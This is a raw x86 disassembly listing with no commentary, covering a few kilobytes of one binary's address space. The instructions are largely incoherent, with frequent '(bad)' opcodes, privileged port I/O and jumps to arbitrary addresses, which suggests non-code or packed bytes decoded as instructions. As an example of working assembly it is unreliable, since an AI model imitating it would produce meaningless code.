  405091:	jmp    0xa50764c8
  405096:	mov    esi,0x32e9077c
  40509b:	jmp    0x82ff:0xea3292ff
  4050a2:	xor    cl,BYTE PTR [edi-0x70c2eabb]
  4050a8:	test   ebp,edi
  4050aa:	leave  
  4050ab:	jl     0x4050ac
  4050ad:	cdq    
  4050ae:	rol    DWORD PTR [esi],0xf8
  4050b1:	test   BYTE PTR [eax],0x0
  4050b4:	inc    edi
  4050b5:	sub    al,0x6f
  4050b8:	dec    ecx
  4050b9:	adc    al,0x0
  4050bb:	repnz repnz pop es
  4050be:	add    eax,0x13c8d0
  4050c3:	jmp    0x28689fe2
  4050c8:	sub    eax,0xcaf5757d
  4050cd:	mov    dl,0xd8
  4050cf:	mov    esi,0x998ae3c1
  4050d4:	pop    ds
  4050d5:	xchg   edi,eax
  4050d6:	hlt    
  4050d7:	mov    dh,0xc1
  4050d9:	jl     0x40512b
  4050db:	cmp    ebp,DWORD PTR [ebp-0x5e61275e]
  4050e1:	mov    al,BYTE PTR [ebp-0x836667]
  4050e7:	or     ecx,0x4c86ff67
  4050ed:	adc    al,0x68
  4050ef:	repz adc bl,0xff
  4050f3:	jne    0x4050fc
  4050f5:	test   bh,dh
  4050f7:	outs   dx,BYTE PTR ds:[esi]
  4050f8:	sar    DWORD PTR [ebp+esi*1-0x3b],0x6b
  4050fd:	sar    edi,cl
  4050ff:	push   eax
  405100:	cdq    
  405101:	call   DWORD PTR fs:[esi-0x45]
  405105:	xchg   esi,eax
  405106:	in     al,0x56
  405108:	mov    eax,ds:0x18006a7c
  40510d:	and    BYTE PTR [ebx],dl
  40510f:	xor    cl,bl
  405111:	pop    ss
  405112:	push   DWORD PTR [ebp-0x63a8]
  405118:	add    BYTE PTR [eax],al
  40511a:	inc    edi
  40511b:	bound  ebx,QWORD PTR [ebx+0x29]
  40511e:	fst    DWORD PTR [edi]
  405120:	call   0xffe490ee
  405125:	mov    DWORD PTR [ebp+0x27fff79b],ecx
  40512b:	sbb    DWORD PTR [eax],eax
  40512d:	push   0x4067d4
  405132:	out    0xe1,eax
  405134:	out    dx,eax
  405135:	mul    edi
  405137:	mov    edi,edi
  405139:	xor    eax,0x405ea4
  40513e:	loopne 0x40511f
  405140:	(bad)  
  405141:	jmp    edi
  405143:	stc    
  405144:	test   al,ch
  405146:	fisttp WORD PTR [ebx-0x535a7c01]
  40514c:	idiv   edi
  40514e:	ja     0x405160
  405150:	je     0x40519b
  405152:	sbb    esp,ebp
  405154:	jmp    0x40514d
  405156:	out    0x8b,eax
  405158:	add    BYTE PTR [eax+ecx*2-0x69],dh
  40515c:	mov    ebp,0xff8bafe8
  405161:	add    BYTE PTR [ebx+eiz*2],bl
  405164:	add    BYTE PTR [bx+si-0x4166],cl
  405169:	call   FWORD PTR ds:0xc8eee778
  40516f:	mov    edi,edi
  405171:	call   FWORD PTR ds:0xe7fff7b4
  405177:	mov    dh,BYTE PTR [ebp+0x8]
  40517a:	mov    al,0xd6
  40517c:	sar    bh,1
  40517e:	add    BYTE PTR [eax],al
  405180:	xlat   BYTE PTR ds:[ebx]
  405181:	mov    dh,BYTE PTR [ebp-0x752018]
  405187:	push   DWORD PTR [ecx]
  405189:	pop    eax
  40518a:	sti    
  40518b:	out    0xfd,eax
  40518d:	cmp    ecx,DWORD PTR [edi-0x5807d101]
  405193:	mul    DWORD PTR [esi]
  405195:	cmp    cl,BYTE PTR [edi-0x1a2ad68b]
  40519b:	rcl    BYTE PTR [esi],1
  40519d:	sub    cl,BYTE PTR [edi-0x70e5ea4b]
  4051a3:	call   FWORD PTR [ecx]
  4051a5:	pop    ebp
  4051a6:	mov    bh,0xff
  4051a8:	(bad)  
  4051a9:	and    DWORD PTR [ecx-0x14],ebx
  4051ac:	dec    BYTE PTR [ecx]
  4051ae:	(bad)
  4051b2:	(bad)  
  4051b3:	jmp    esi
  4051b5:	aas    
  4051b6:	pushf  
  4051b7:	neg    esi
  4051b9:	sbb    DWORD PTR [ebx-0x719602e6],0x965c84ff
  4051c3:	inc    esi
  4051c5:	pop    ecx
  4051c6:	sbb    BYTE PTR [eax],cl
  4051c8:	leave  
  4051c9:	xchg   DWORD PTR [ebp+0x5849b6ff],ecx
  4051cf:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051d1:	push   ecx
  4051d2:	mov    gs,eax
  4051d4:	xor    BYTE PTR [ecx+0x279eff8e],ah
  4051da:	mov    ecx,gs
  4051dc:	aad    0xaa
  4051de:	mov    ?,edi
  4051e0:	mov    ss,WORD PTR [edi]
  4051e2:	nop
  4051e3:	call   0xd33a51e8
  4051e8:	add    al,BYTE PTR [eax]
  4051ea:	push   0xddfffbae
  4051ef:	cmc    
  4051f0:	sahf   
  4051f1:	xor    DWORD PTR [ebp-0x70],0x19
  4051f5:	add    bl,bl
  4051f7:	imul   ecx,DWORD PTR [esi-0xd6ad68b],0xffffffd0
  4051fe:	push   esi
  4051ff:	jmp    0x138d977f
  405204:	ror    DWORD PTR [ecx],1
  405206:	push   ss
  405207:	aad    0xe8
  405209:	mov    es,esp
  40520b:	or     eax,DWORD PTR [ecx+0x27]
  40520e:	aaa    
  40520f:	jp     0x40525f
  405211:	sbb    ecx,eax
  405213:	sub    DWORD PTR [eax-0xeffd9fd],ebp
  405219:	fwait
  40521a:	xchg   BYTE PTR [edx+0x36],bh
  40521d:	mov    cs,WORD PTR [ecx+0x3144febb]
  405223:	jns    0x4051c1
  405225:	sti    
  405226:	push   cs
  405227:	cmp    DWORD PTR [esi+ecx*4],ebx
  40522a:	(bad)  
  40522b:	in     al,dx
  40522c:	pop    es
  40522d:	fidiv  WORD PTR [ecx+0x14]
  405230:	push   cs
  405231:	sbb    BYTE PTR [ecx],bh
  405233:	ins    BYTE PTR es:[edi],dx
  405234:	(bad)  
  405235:	nop
  405236:	out    0x79,al
  405238:	(bad)  
  405239:	pop    ss
  40523a:	fnstsw WORD PTR [ecx+0x7c]
  40523d:	sti    
  40523e:	into   
  40523f:	and    DWORD PTR [eax],ebx
  405241:	mov    cs,esi
  405243:	dec    ebx
  405244:	stos   DWORD PTR es:[edi],eax
  405245:	or     BYTE PTR [ecx],dh
  405247:	fbstp  TBYTE PTR [ecx-0x60]
  40524a:	add    BYTE PTR [eax],al
  40524c:	dec    ecx
  40524d:	adc    al,0xe9
  40524f:	pushf  
  405250:	ja     0x4052cb
  405252:	push   esp
  405253:	add    BYTE PTR [esi+0x159bf0ff],ch
  405259:	jg     0x405219
  40525b:	lea    ebp,[eax+0x56]
  40525e:	loope  0x405263
  405260:	cld    
  405261:	mov    WORD PTR [ebp-0x16f7f37f],?
  405267:	cld    
  405268:	mov    dl,0x36
  40526a:	call   0x1cb98372
  40526f:	add    BYTE PTR [ecx+0x6e8daede],cl
  405275:	or     eax,0xec4117a9
  40527a:	stos   DWORD PTR es:[edi],eax
  40527b:	fdivr  st(1),st
  40527d:	adc    eax,DWORD PTR [eax]
  40527f:	jbe    0x4052bf
  405281:	or     al,ch
  405283:	and    al,BYTE PTR [ecx+edi*2+0x7ee70ff]
  40528a:	push   0xffffffe9
  40528c:	sbb    dl,dl
  40528e:	das    
  40528f:	test   al,0x32
  405291:	in     al,dx
  405292:	push   eax
  405293:	sbb    DWORD PTR [edx+0x14],esi
  405296:	(bad)  
  405297:	cld    
  405298:	push   esi
  405299:	sub    eax,DWORD PTR [ecx-0x17]
  40529c:	mov    edx,0xa436d5e1
  4052a1:	or     al,0xc0
  4052a3:	mov    ch,0x1c
  4052a5:	leave  
  4052a6:	dec    edi
  4052a7:	es push ds
  4052a9:	or     al,ch
  4052ab:	cs (bad) 
  4052ad:	js     0x4052ae
  4052af:	mov    ecx,0x79420000
  4052b4:	jne    0x405297
  4052b6:	retf   0xffa2
  4052b9:	push   es
  4052ba:	mov    ah,0x6b
  4052bc:	and    DWORD PTR [edx],ebx
  4052be:	lods   al,BYTE PTR ds:[esi]
  4052bf:	js     0x4052a9
  4052c1:	aad    0xa1
  4052c3:	js     0x4052c4
  4052c5:	xor    DWORD PTR [edx],0xffffffec
  4052c8:	inc    ebp
  4052c9:	sbb    DWORD PTR [edx+0x14],esi
  4052cc:	push   0xffd3e538
  4052d1:	inc    eax
  4052d2:	xor    edx,DWORD PTR [eax+eax*1]
  4052d5:	imul   ecx,edx,0xb5c6d619
  4052db:	or     al,0xc0
  4052dd:	xor    eax,0xb64fc88f
  4052e2:	aas    
  4052e3:	or     al,ch
  4052e5:	push   esi
  4052e6:	les    edi,FWORD PTR [eax-0x1]
  4052e9:	cmp    DWORD PTR ds:0x9af17579,edi
  4052ef:	(bad)  
  4052f1:	xchg   esi,eax
  4052f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052f3:	imul   ebp,ecx,0xffffffbb
  4052f6:	mov    ebp,0xb400e878
  4052fb:	ret    0xffff
  4052fe:	inc    edx
  4052ff:	adc    BYTE PTR [eax+0x46],ch
  405302:	cwde   
  405303:	aad    0xff
  405305:	addr16 inc esp
  405307:	fs inc eax
  405309:	add    bh,cl
  40530b:	popa   
  40530c:	pop    ebx
  40530d:	sub    DWORD PTR [ecx-0xa1a17ec],ecx
  405313:	xchg   edi,edi
  405315:	or     eax,DWORD PTR [eax]
  405317:	add    BYTE PTR [eax+0x1f],bl
  40531a:	push   ds
  40531b:	push   eax
  40531c:	enter  0x7588,0xc
  405320:	sub    BYTE PTR [ecx],0xd6
  405323:	call   FWORD PTR [edi+0x43]
  405326:	push   eax
  405327:	inc    ebp
  405329:	jnp    0x405312
  40532b:	and    BYTE PTR [edi-0x78],cl
  40532e:	(bad)  
  40532f:	call   0x40188c
  405334:	xor    ah,bl
  405336:	sar    edi,1
  405338:	aas    
  405339:	sbb    eax,0x63966800
  40533e:	inc    eax
  40533f:	add    al,al
  405341:	pop    ds
  405342:	xor    BYTE PTR [ecx-0x38],al
  405345:	sbb    eax,DWORD PTR [edx]
  405347:	add    al,bl
  405349:	xchg   ebx,eax
  40534a:	call   0xffcbd8fc
  40534f:	or     ecx,DWORD PTR [eax-0x7afe1dc]
  405355:	mov    dh,BYTE PTR [ebp+0xc]
  405358:	jo     0x4053cc
  40535a:	aad    0xff
  40535c:	outs   dx,DWORD PTR ds:[esi]
  40535d:	inc    eax
  40535e:	push   eax
  40535f:	jmp    DWORD PTR [ebp+0x78]
  405362:	out    0xe8,eax
  405364:	fimul  WORD PTR [ebx-0x41bf1701]
  40536a:	(bad)  
  40536b:	jmp    DWORD PTR [eax-0x60002de1]
  405371:	sbb    BYTE PTR [esi],ah
  405373:	xor    BYTE PTR [ecx],dh
  405375:	sub    al,0x4
  405377:	jmp    esp
  405379:	pop    eax
  40537a:	fwait
  40537b:	add    eax,0x8e7f0000
  405380:	mov    edx,DWORD PTR [eax+0x1]
  405383:	not    BYTE PTR [eax]
  405385:	or     BYTE PTR [ecx-0x5a],cl
  405388:	mov    bh,bh
  40538a:	dec    esi
  40538b:	xchg   ebp,eax
  40538c:	xor    edx,edx
  40538e:	inc    esi
  40538f:	out    dx,al
  405390:	mov    dh,BYTE PTR [ebp+0x2d]
  405393:	in     eax,0x3a
  405395:	shl    BYTE PTR [esi],cl
  405397:	fidivr WORD PTR [edx+eax*8-0x74cf92c7]
  40539e:	adc    eax,0x8bf4bfea
  4053a3:	ins    DWORD PTR es:[edi],dx
  4053a4:	sbb    eax,0xfbb81602
  4053a9:	out    0x80,eax
  4053ab:	push   ss
  4053ac:	mov    edi,edi
  4053ae:	mov    eax,0x346887a7
  4053b3:	ins    BYTE PTR es:[edi],dx
  4053b4:	add    eax,DWORD PTR [eax]
  4053b6:	or     DWORD PTR [edx-0xc11004b],ebp
  4053bc:	inc    eax
  4053bd:	clc    
  4053be:	pop    ecx
  4053bf:	imul   eax,DWORD PTR [eax+eax*1],0xf8107631
  4053c6:	leave  
  4053c7:	xor    al,0x67
  4053c9:	add    BYTE PTR [ecx],dh
  4053cb:	jb     0x405390
  4053cd:	je     0x4053ec
  4053cf:	xor    BYTE PTR [eax],al
  4053d1:	add    DWORD PTR [ecx],esi
  4053d3:	ins    DWORD PTR es:[edi],dx
  4053d4:	adc    cl,BYTE PTR ds:0xff8bd7b6
  4053da:	and    al,0x75
  4053dc:	fwait
  4053dd:	mov    BYTE PTR [edi+0xeb8a4d],ah
  4053e3:	add    BYTE PTR [ecx],ch
  4053e5:	mov    dh,0x10
  4053e7:	clc    
  4053e8:	mov    eax,eax
  4053ea:	mov    ah,0xff
  4053ec:	mov    ss,edx
  4053ee:	(bad)  
  4053f0:	in     eax,dx
  4053f1:	adc    edi,DWORD PTR [edi-0x621c8176]
  4053f7:	adc    BYTE PTR [ecx],ch
  4053f9:	ins    BYTE PTR es:[edi],dx
  4053fa:	pop    es
  4053fb:	mov    ch,BYTE PTR [esi+0x76]
  4053fe:	add    ebp,esi
  405400:	dec    esi
  405401:	aas    
  405402:	lahf   
  405403:	mov    bl,BYTE PTR [esi+0xa]
  405406:	test   eax,0xbaec3d0f
  40540b:	shl    ecx,cl
  40540d:	adc    ebx,DWORD PTR [ecx]
  40540f:	pushf  
  405410:	js     0x405472
  405412:	data16 mov ah,cl
  405415:	jbe    0x4053eb
  405417:	sti    
  405418:	dec    esi
  405419:	(bad)  
  40541a:	push   esi
  40541b:	mov    ch,BYTE PTR [esi]
  40541d:	jmp    0x405428
  40541f:	pushf  
  405420:	cmp    al,0x5e
  405422:	inc    esi
  405423:	mov    ch,BYTE PTR [edx]
  405425:	push   esp
  405426:	mov    ch,0xef
  405428:	mov    es,WORD PTR [edx-0x7]
  40542b:	inc    esp
  40542c:	xor    esp,esp
  40542e:	inc    eax
  40542f:	pop    ebp
  405430:	fdiv   QWORD PTR [ebp+0x26]
  405433:	xor    edi,esi
  405435:	push   eax
  405437:	fwait
  405438:	inc    ecx
  405439:	jbe    0x405451
  40543b:	mov    bl,BYTE PTR [ebx+0x18]
  40543e:	add    DWORD PTR [ecx-0x1f98a04],edx
  405444:	sahf   
  405445:	add    ch,dl
  405447:	sbb    eax,DWORD PTR [eax]
  405449:	add    BYTE PTR [ebx],ah
  40544b:	inc    esp
  40544c:	test   al,0x3
  40544e:	popa   
  40544f:	ins    BYTE PTR es:[edi],dx
  405450:	bound  esi,QWORD PTR [eax-0x76c68a3a]
  405456:	inc    esp
  405457:	or     al,0xd1
  405459:	repz mov ah,0x75
  40545c:	(bad)  
  40545d:	push   ds
  40545e:	xor    esp,ebp
  405460:	adc    esp,edx
  405462:	icebp  
  405463:	adc    edx,DWORD PTR [ecx+0x33]
  405466:	popa   
  405467:	shr    eax,cl
  405469:	mov    BYTE PTR [eax+ebx*8-0x1],bl
  40546d:	push   edx
  40546f:	adc    ebp,eax
  405471:	pop    ecx
  405472:	shl    DWORD PTR [ebp-0x1],0x39
  405476:	test   al,0xff
  405478:	pop    es
  405479:	xchg   ecx,eax
  40547a:	mov    ds:0x4f96ff77,al
  40547f:	adc    al,0x68
  405481:	daa    
  405482:	jge    0x405458
  405484:	call   DWORD PTR [eax]
  405486:	and    al,BYTE PTR [ecx+eax*2-0x17]
  40548a:	test   eax,0xf3c05c3f
  40548f:	adc    ebp,eax
  405491:	stc    
  405492:	xchg   esi,eax
  405493:	jne    0x405494
  405495:	bnd jb 0x405498
  405498:	push   ss
  405499:	jo     0x405491
  40549b:	jg     0x40549c
  40549d:	fdivr  QWORD PTR [esi-0x351e8a8c]
  4054a3:	ret    0x46fd
  4054a6:	test   al,0x74
  4054a8:	jne    0x4054df
  4054aa:	mov    ch,0x35
  4054ac:	shl    DWORD PTR [esi],1
  4054ae:	add    BYTE PTR [eax],al
  4054b0:	mov    eax,0xf5c0ffe9
  4054b5:	and    al,0x41
  4054b7:	jmp    0xa87054d6
  4054bc:	xor    dh,BYTE PTR [ebp+0x35]
  4054bf:	mov    ch,0xb
  4054c1:	aam    0xff
  4054c3:	add    al,bh
  4054c5:	pusha  
  4054c6:	inc    DWORD PTR [esi]
  4054c8:	and    eax,0xbaf17575
  4054cd:	mov    bl,0xfd
  4054cf:	idiv   BYTE PTR [ecx+0x7080ffe9]
  4054d5:	inc    esp
  4054d6:	inc    ecx
  4054d7:	jmp    0x287054f6
  4054dc:	sub    eax,0x8a353575
  4054e1:	sar    edi,cl
  4054e3:	rcr    BYTE PTR [ecx+0x7700ff60],0x77
  4054ea:	mov    edi,0x44f97e74
  4054ef:	hlt    
  4054f0:	mov    DWORD PTR ds:0x783dfff4,0x8bd560e7
  4054fa:	(bad)  
  4054fb:	call   FWORD PTR ds:0xa8ede8a4
  405501:	mov    edi,edi
  405503:	push   0x58
  405505:	sbb    BYTE PTR [ebx],bh
  405507:	xor    BYTE PTR [ecx],cl
  405509:	adc    BYTE PTR [eax+0x51],ch
  40550c:	cwde   
  40550d:	sar    edi,1
  40550f:	addr16 pop edx
  405511:	adc    BYTE PTR [eax],al
  405513:	add    BYTE PTR [eax],0x0
  405516:	mov    al,0x9b
  405518:	sar    edi,cl
  40551a:	xlat   BYTE PTR ds:[ebx]
  40551b:	inc    eax
  40551c:	push   DWORD PTR [ebp+0x40]
  40551f:	cwde   
  405520:	push   eax
  405521:	std    
  405522:	xchg   DWORD PTR [edx+ebp*2+0x2fd5f000],ebx
  405529:	inc    ecx
  40552a:	or     BYTE PTR [eax],dl
  40552c:	push   ecx
  40552d:	xor    cl,cl
  40552f:	pop    ss
  405530:	push   0x80181802
  405535:	call   0x3ffd62
  40553a:	add    ebx,DWORD PTR [eax+0x74]
  40553d:	push   ss
  40553e:	xor    DWORD PTR [edx],0xa3cdfff4
  405544:	push   DWORD PTR [ebp-0x30]
  405547:	(bad)  
  405548:	adc    ebp,edi
  40554a:	aaa    
  40554b:	pushf  
  40554c:	push   DWORD PTR [ebp-0x24]
  40554f:	mov    ds,WORD PTR [esi+0x6a9bc7d0]
  405555:	add    BYTE PTR [eax-0x37bed0a0],dh
  40555b:	pcmpeqb mm6,QWORD PTR [eax]
  40555e:	or     DWORD PTR [eax],ebx
  405560:	push   0x37d3102
  405565:	sbb    BYTE PTR [ecx-0x61004c63],0xd
  40556c:	xchg   DWORD PTR [ebp+0x29],esi
  40556f:	inc    ebp
  405570:	add    eax,0x1aaa8efd
  405575:	add    BYTE PTR [ecx],bl
  405577:	cmp    edx,esp
  405579:	inc    eax
  40557a:	add    BYTE PTR [eax],al
  40557c:	xor    DWORD PTR ds:0x7cf03010,eax
  405582:	sbb    eax,DWORD PTR [edx]
  405584:	xor    DWORD PTR [ebp-0x7d],edi
  405587:	call   0xffc8043c
  40558c:	sub    bh,BYTE PTR [ebp+0x38a81610]
  405592:	nop
  405593:	inc    esp
  405595:	lock xchg BYTE PTR [ebp+0x39],dh
  405599:	xchg   ebp,eax
  40559a:	ret    0x3efc
  40559d:	cli    
  40559e:	xchg   BYTE PTR [ebp+0x3d],dh
  4055a1:	lds    esi,FWORD PTR [esi]
  4055a3:	shr    BYTE PTR [esi],1
  4055a5:	retf   0x7586
  4055a8:	and    eax,0x90810e2
  4055ad:	aas    
  4055ae:	mov    ecx,0xc22416ff
  4055b3:	add    al,0x31
  4055b5:	nop
  4055b6:	jp     0x4055a4
  4055b8:	cdq    
  4055b9:	jge    0x4055be
  4055bb:	out    dx,eax
  4055bc:	mov    edi,0xf60c1139
  4055c1:	xchg   ebx,edi
  4055c3:	out    0x46,eax
  4055c5:	ja     0xfc7f4eca
  4055cb:	inc    DWORD PTR [ebp-0x127e681a]
  4055d1:	sub    BYTE PTR [esi-0x7ebe3101],al
  4055d7:	mov    eax,0x8681c7
  4055dc:	xor    DWORD PTR [ecx+ebp*8],edx
  4055df:	add    eax,DWORD PTR [eax]
  4055e1:	add    BYTE PTR [edx-0x11051328],ch
  4055e7:	out    0xeb,eax
  4055e9:	sub    DWORD PTR [ecx+0x14],0x54
  4055ed:	add    DWORD PTR [eax+0x3103e7cc],ecx
  4055f3:	jae    0x405629
  4055f5:	clc    
  4055f6:	xchg   esi,eax
  4055f7:	adc    DWORD PTR [ebx-0x56e1797a],0x66fc2e10
  405601:	xlat   BYTE PTR ds:[ebx]
  405602:	icebp  
  405603:	adc    ebx,DWORD PTR [esi+0x627c3d10]
  405609:	mov    dl,0x66
  40560b:	jb     0x40558f
  40560d:	clc    
  40560e:	(bad)  
  40560f:	push   esi
  405610:	aad    0x44
  405612:	xor    DWORD PTR [ebx-0xc],esi
  405615:	not    DWORD PTR [esi-0x11]
  405618:	cdq    
  405619:	xchg   BYTE PTR [esi-0x64],al
  40561c:	fs dec ebx
  40561e:	aas    
  40561f:	jb     0x405687
  405621:	sbb    esi,edi
  405623:	adc    al,0xe9
  405625:	add    edi,DWORD PTR [edi+edx*4+0x7226852b]
  40562c:	mov    ecx,0x4662259b
  405631:	xchg   BYTE PTR [edi+edx*4+0x720e852b],ah
  405638:	cdq    
  405639:	xchg   BYTE PTR [esp+ebp*4+0x7cfe862f],bh
  405640:	fldenv [ecx+esi*1+0x14]
  405644:	jo     0x4055c6
  405646:	add    BYTE PTR [eax],al
  405648:	lods   eax,DWORD PTR ds:[esi]
  405649:	jb     0x405661
  40564b:	xchg   BYTE PTR [ecx+0x21],dh
  40564e:	mov    dh,BYTE PTR gs:[ecx]
  405651:	adc    al,0xe9
  405653:	js     0x405611
  405655:	push   esi
  405656:	inc    DWORD PTR [ebp-0x14ff9632]
  40565c:	ret    0xff71
  40565f:	jmp    0x2bcd4d92
  405664:	fabs   
  405666:	addr16 mov al,ds:0xd489
  40566a:	inc    eax
  40566c:	sahf   
  40566d:	mov    ah,0x0
  40566f:	jmp    0xecb6080d
  405674:	mov    ebx,0x32e900a3
  405679:	lahf   
  40567a:	xchg   ebp,eax
  40567b:	stos   DWORD PTR es:[edi],eax
  40567c:	scas   eax,DWORD PTR es:[edi]
  40567d:	jno    0x40567e
  40567f:	pop    esp
  405680:	repz aas 
  405682:	push   eax
  405683:	adc    eax,ebp
  405685:	aas    
  405686:	inc    ecx
  405687:	jmp    0xe9e0bb56
  40568c:	xor    bl,BYTE PTR ds:0x7c5e14c0
  405692:	xchg   esp,eax
  405693:	jmp    0xaca86aca
  405698:	ins    DWORD PTR es:[edi],dx
  405699:	aam    0xff
  40569b:	jne    0x4056d3
  40569d:	and    al,ch
  40569f:	jbe    0x405624
  4056a1:	jno    0x4056a2
  4056a3:	je     0x40566b
  4056a5:	push   ebp
  4056a6:	(bad)  
  4056a7:	pop    esi
  4056a8:	mov    ah,0x9e
  4056aa:	push   edx
  4056ab:	add    eax,0xc4630000
  4056b0:	out    0x12,eax
  4056b2:	loopne 0x405724
  4056b4:	call   FWORD PTR [ecx-0x66f01953]
  4056ba:	mov    ch,0xe6
  4056bc:	pop    es
  4056bd:	inc    ecx
  4056be:	add    esi,DWORD PTR [edx-0x1]
  4056c1:	cs popf 
  4056c3:	sub    edi,ecx
  4056c5:	lods   al,BYTE PTR es:[esi]
  4056c7:	jl     0x40572c
  4056c9:	ins    BYTE PTR es:[edi],dx
  4056ca:	jae    0x40570c
  4056cc:	mov    DWORD PTR [ecx+eax*4+0x72],ebp
  4056d0:	dec    DWORD PTR [esi]
  4056d2:	cmp    eax,0x89003054
  4056d7:	adc    al,0xff
  4056d9:	mov    ch,0x4
  4056db:	call   0xa0:0xdf30ffff
  4056e2:	enter  0xbf6b,0x74
  4056e6:	push   es
  4056e7:	adc    ch,cl
  4056e9:	sub    BYTE PTR [ecx+0x18],bl
  4056ec:	push   DWORD PTR [ebp-0x74]
  4056ef:	mov    WORD PTR [ecx-0x68902e],gs
  4056f5:	mov    ch,0x14
  4056f7:	xchg   edi,eax
  4056f8:	(bad)  
  4056f9:	jmp    FWORD PTR [eax]
  4056fb:	nop
  4056fc:	icebp  
  4056fd:	sar    BYTE PTR [edi+0xb505097],cl
  405703:	sbb    dl,BYTE PTR [eax]
  405705:	add    BYTE PTR [ecx+ebp*2],dl
  405708:	addr16 lahf 
  40570a:	mov    ch,dl
  40570c:	dec    DWORD PTR [edi-0x50]
  40570f:	out    dx,eax
  405710:	mov    al,ds:0x48000000
  405715:	mov    eax,DWORD PTR ds:0x1449b8
  40571b:	add    BYTE PTR [edx],dl
  40571d:	imul   edi,DWORD PTR [edi-0xddae8c],0x75
  405724:	push   eax
  405725:	mov    WORD PTR [esi-0x17683002],ss
  40572b:	rcr    DWORD PTR [esi-0x68],1
  40572e:	dec    DWORD PTR [ebp-0x1aa6b]
  405734:	outs   dx,DWORD PTR ds:[esi]
  405735:	and    edi,edi
  405737:	mov    ch,0xac
  405739:	cdq    
  40573a:	(bad)  
  40573b:	jmp    DWORD PTR [eax+0x30]
  40573e:	mov    al,ds:0xbfef1800
  405743:	setne  BYTE PTR [ebx-0x2]
  405747:	dec    DWORD PTR [edi-0x68]
  40574a:	mov    ch,0xbc
  40574c:	dec    esi
  40574d:	cwde   
  40574e:	(bad)  
  40574f:	call   0xa39a85
  405754:	xor    DWORD PTR [esi],ebx
  405756:	dec    esi
  405757:	mov    eax,0xe88416d7
  40575c:	nop
  40575d:	aas    
  40575e:	test   bh,bh
  405760:	clc    
  405761:	cmp    esi,edi
  405763:	jmp    DWORD PTR [ebp-0xe]
  405766:	xchg   esi,eax
  405767:	sub    ebp,0x79
  40576a:	dec    ebx
  40576b:	inc    ebp
  40576c:	lods   eax,DWORD PTR ds:[esi]
  40576d:	jge    0x405772
  40576f:	add    BYTE PTR [ecx],dh
  405771:	inc    esi
  405772:	stc    
  405773:	or     ecx,DWORD PTR [ecx+0xff56a6]
  405779:	add    BYTE PTR [esi+0x2b744362],dl
  40577f:	in     al,0xc8
  405781:	sti    
  405782:	xchg   BYTE PTR [eax],dh
  405784:	adc    al,0xff
  405786:	add    al,0xc1
  405788:	ins    BYTE PTR es:[edi],dx
  405789:	adc    eax,0x5083b663
  40578e:	outs   dx,BYTE PTR ds:[esi]
  40578f:	or     BYTE PTR [eax-0x7c492b18],al
  405795:	jmp    FWORD PTR [esi+0x306a8038]
  40579b:	xchg   esi,eax
  40579c:	stc    
  40579d:	sti    
  40579e:	dec    esi
  40579f:	push   0xe6fde80b
  4057a4:	cmp    bh,0x3e
  4057a7:	push   0x26dce87f
  4057ac:	cmp    edi,0xfffffff8
  4057af:	cmp    dl,BYTE PTR [eax]
  4057b1:	add    BYTE PTR [edx+esi*8+0x6f],bh
  4057b5:	xor    ebp,0x16ff81cc
  4057bb:	inc    ebx
  4057bc:	add    ebp,DWORD PTR [edx+0x32]
  4057bf:	cs stc 
  4057c1:	pop    es
  4057c2:	sbb    DWORD PTR [ecx-0xc0100b2],esi
  4057c8:	enter  0x89fb,0x14
  4057cc:	in     eax,dx
  4057cd:	add    al,0x31
  4057cf:	adc    al,0x6c
  4057d1:	mov    esi,ebx
  4057d3:	ins    DWORD PTR es:[edi],dx
  4057d4:	push   ss
  4057d5:	add    DWORD PTR [ecx+0x31a3357c],0x14
  4057dc:	repnz inc ebx
  4057de:	add    BYTE PTR [eax],al
  4057e0:	ds cwde 
  4057e2:	dec    edx
  4057e3:	add    al,0x31
  4057e5:	adc    al,0xb4
  4057e7:	pop    es
  4057e8:	xor    BYTE PTR [ecx+ebp*8],dl
  4057eb:	adc    ch,BYTE PTR [esi+0x3103e98b]
  4057f1:	cld    
  4057f2:	xchg   ebp,eax
  4057f3:	xor    esi,eax
  4057f5:	adc    esp,DWORD PTR [eax+ecx*4-0x5a]
  4057f9:	ins    DWORD PTR es:[edi],dx
  4057fa:	into   
  4057fb:	add    BYTE PTR [ecx],0x7c
  4057fe:	mov    dl,BYTE PTR [esi+ecx*4+0x6e]
  405802:	jo     0x40578c
  405804:	sub    DWORD PTR [ebp-0x4a],0xb9a87e82
  40580b:	xor    DWORD PTR [esi+0x6e],0x14300811
  405812:	jmp    0x97a704a7
  405817:	sbb    BYTE PTR [esi-0x3d],0x0
  40581b:	push   ebx
  40581c:	or     ebp,edx
  40581e:	call   0x2863d30e
  405823:	add    al,0xd9
  405825:	pop    eax
  405826:	mov    ecx,0x63763ec4
  40582b:	mov    ds:0x43f21431,al
  405830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405831:	add    edx,ebx
  405833:	add    esi,DWORD PTR [edi+edx*4+0x6e1e815e]
  40583a:	mov    ecx,0x511c9c82
  40583f:	popf   
  405840:	or     al,0x6e
  405842:	add    BYTE PTR ds:[eax],0x0
  405846:	mov    esp,0xb3370064
  40584b:	ins    DWORD PTR es:[edi],dx
  40584c:	push   0x142de5
  405851:	je     0x40580c
  405853:	gs (bad) 
  405855:	push   ds
  405856:	mov    bl,0xc4
  405858:	addr16 es or dl,bl
  40585c:	inc    DWORD PTR [eax-0x16bedb7e]
  405862:	ficomp DWORD PTR [eax+0x30]
  405865:	test   al,0x32
  405867:	jl     0x4058b8
  405869:	push   esi
  40586a:	xor    dl,BYTE PTR [ebx+ecx*1]
  40586d:	sub    DWORD PTR [esi-0x401695fc],edi
  405873:	xchg   edi,eax
  405874:	neg    edi
  405876:	mov    al,0x6d
  405878:	push   eax
  405879:	(bad)  
  40587a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587b:	adc    eax,0x6d162ee8
  405880:	inc    esi
  405882:	(bad)  
  405883:	fs (bad) 
  405885:	mov    esi,0xa47d7cb0
  40588a:	mov    al,0x6d
  40588c:	push   0x2
  40588e:	add    eax,0xb0a6d157
  405893:	sbb    eax,eax
  405895:	adc    eax,0xd9a5fc11
  40589a:	jae    0x405909
  40589c:	dec    edi
  40589d:	xor    DWORD PTR [edi+0x44],0xfb6586ff
  4058a4:	call   FWORD PTR [eax]
  4058a6:	mov    al,0xe7
  4058a8:	pop    es
  4058a9:	add    DWORD PTR [eax],0xff6f0700
  4058af:	outs   dx,BYTE PTR ds:[esi]
  4058b0:	(bad)
  4058b3:	data16 mov al,0xfb
  4058b6:	xchg   esp,eax
